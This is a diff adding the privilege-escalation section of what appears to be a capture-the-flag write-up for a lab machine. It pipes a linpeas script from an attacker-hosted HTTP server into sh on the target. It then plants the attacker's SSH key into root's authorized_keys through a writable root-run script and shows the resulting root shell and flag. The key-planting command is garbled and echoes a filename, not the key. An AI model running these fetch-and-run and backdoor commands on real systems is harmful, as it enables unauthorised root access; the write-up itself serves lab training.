@@ -73,5 +73,42 @@ Try to upload linpeas ( LinPEAS is a script that search for possible paths to es
 
 Install linpeas <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">Linpeas</a>
 
+Start python server where are your linpeas.sh file and curl to the target machine.
 
+```
+sudo python -m SimpleHTTPServer 80 #Host
+curl 10.10.10.10/linpeas.sh | sh #Victim
+```
 
+We can see that root has been accessing this file: “/usr/bin/timer_backup.sh”. Which is owned by your user and writeable.
+
+![ak](https://media.discordapp.net/attachments/490431433559506954/832944544067878932/unknown.png)
+
+You need to create your ssh key, and you need to replace your ssh publickey to /root/.ssh/authorized_keys” >> /usr/bin/timer_backup.sh to do this follow commands :
+
+```
+#ssh-keygen
+( no passphrase ) 
+Copy your id_rsa.pub key 
+and paste this command in target machine : echo "echo id_rsa.pub >> /root/.ssh/authorized_keys" >> /usr/bin/timer_backup.sh
+
+Now : chmod 600 id_rsa && ssh -i id_rsa root@10.10.10.214
+
+Done ! 
+
+```sh
+root@time:~# whoami
+root
+root@time:~# id
+uid=0(root) gid=0(root) groups=0(root) 
+```
+
+Got the root flag 
+
+```sh
+root@time:~# cat /root/root.txt
+adsd9hf0c86b8786477033415e3018a4
+```
+## Summary Of Knowledge : 
+
+- 
